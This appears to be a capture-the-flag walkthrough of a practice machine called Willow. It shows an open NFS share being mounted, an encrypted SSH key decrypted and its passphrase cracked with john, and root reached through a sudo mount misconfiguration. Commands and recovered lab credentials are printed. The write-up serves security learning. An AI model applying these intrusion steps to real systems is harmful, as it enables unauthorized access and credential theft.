...
In this challenge we find encrypted `RSA private key` on the root page.
Then, we find on the `nfs` share the decryption keys, we decrypt the RSA key and crack the `passphrase`, and then get shell as `willow`.

Lastly, we `mount` using `sudo` to `/dev/hidden_backup`, and find credentials for root user. The flag is hidden inside `user.jpg`, encrypted with the root password.
...
we can see port `22` with ssh, port `80` with apache http server, port `111` with rpc and port `2049` with nfs.
...
| ssh-dss                                         
|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)                                                                                                                                                    
| ssh-rsa                                       
...
|   100005  1,2,3      34273/udp   mountd                                                                                                                                                    
|   100005  1,2,3      40108/tcp   mountd                                                                                                                                                    
|   100005  1,2,3      46825/udp6  mountd                                                                                                                                                    
|   100005  1,2,3      58731/tcp6  mountd                                                                                                                                                    
|   100021  1,3,4      41864/tcp   nlockmgr                                                                                                                                                  
|   100021  1,3,4      45753/udp6  nlockmgr                                                                                                                                                  
|   100021  1,3,4      47728/tcp6  nlockmgr                                                                                                                                                  
|   100021  1,3,4      55398/udp   nlockmgr                                                                                                                                                  
|   100024  1          32962/tcp6  status                                                                                                                                                    
|   100024  1          57464/udp   status                                                                                                                                                    
|   100024  1          58678/tcp   status                                                                                                                                                    
|   100024  1          59670/udp6  status                                                                                                                                                    
...
I added `willow.thm` to my `/etc/hosts`

### Find encrypted ssh private key

When I visited the root page, we can see this long string

![page](image-1.png)

I converted this from hex using CyberChef
...
Okay, we need to find some decryption key.

### Find decryption key on nfs share and decrypting the ssh key plus brute force passphrase

Remember we saw port `2049` is opened, let's check if there are some nfs shares we can mount:
```bash
┌──(agonen㉿kali)-[~/thm/Willow]
└─$ showmount -e willow.thm         
Export list for willow.thm:
/var/failsafe *
```

we can mount to the folder ew created `/mnt/willow_nfs`:
```bash
sudo mount -t nfs willow.thm:/ /mnt/willow_nfs
```

To unmomunt, just execute:
```bash
sudo umount /mnt/willow_nfs
```

After mounting, we can find this rsa_keys:
```bash
┌──(agonen㉿kali)-[/mnt/willow_nfs/var/failsafe]
└─$ cat rsa_keys 
...
Okay, so we got these RSA params:
```bash
e=23
n=37627
d=61527
...
Using this website, [https://www.cs.drexel.edu/~popyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html](https://www.cs.drexel.edu/~popyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html), I decrypted the encrypted private key
...
I tried to use this private key, after changing to read only using `chmod 600 id_rsa`, however, It wanted a passphrase

![want pass](image-6.png)

I used `ssh2john` and `john` to crack the passphrase.
```bash
┌──(agonen㉿kali)-[~/thm/Willow]                                                                                                         
...
wildflower       (id_rsa)                                                                                                                        
1g 0:00:00:00 DONE (2025-12-25 14:33) 20.00g/s 202240p/s 202240c/s 202240C/s amirul..teixeira                                                    
Use the "--show" option to display all of the cracked passwords reliably                                                                         
Session completed.           
```

So we got the passphrase `wildflower`.

![passphrase](image-3.png)

In order to login via ssh, based on [https://stackoverflow.com/a/74846456](https://stackoverflow.com/a/74846456) we'll need to add a flag:
```bash
ssh willow@willow.thm -i id_rsa -o PubkeyAcceptedKeyTypes=ssh-rsa # wildflower
```

![login](image-7.png)

on the home folder, we can find the file `user.jpg`:
...
### Privilege Escalation to Root using mount to hidden backup

When we check for sudo privileges, we can see we have sudo on mount:
```bash
...
Since it uses `*`, we can basically mount whatever we want.

I checked what block devices we have:
```bash
willow@willow-tree:/dev$ find /dev/ -type b
/dev/hidden_backup
/dev/xvdh
/dev/xvda3
/dev/xvda2
...
Okay, the `/dev/hidden_backup` is very interesting.
I created folder on `/tmp` and mounted it.
```bash
willow@willow-tree:/dev$ mkdir /tmp/hidden_backup -p
willow@willow-tree:/dev$ sudo /bin/mount /dev/hidden_backup /tmp/hidden_backup/
```

![mount](image-8.png)

Next, we can find inside the file `creds.txt`:
```bash
willow@willow-tree:/dev$ cat /tmp/hidden_backup/creds.txt 
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
```

We got some credentials, let's grab the root flag

```bash
willow@willow-tree:/dev$ su root # 7QvbvBTvwPspUK
Password: 
root@willow-tree:/dev# cat /root/root.txt 
...
Oh, the flag isn't here.

However, I remember that when I downloaded the `user.jpg`, I first checked for `steghide` and saw there is something, but I didn't managed to brute force the password. 
Let's try again, this time with the root password `7QvbvBTvwPspUK`.
...
```bash
┌──(agonen㉿kali)-[~/thm/Willow]
└─$ steghide extract -sf user.jpg -p 7QvbvBTvwPspUK   
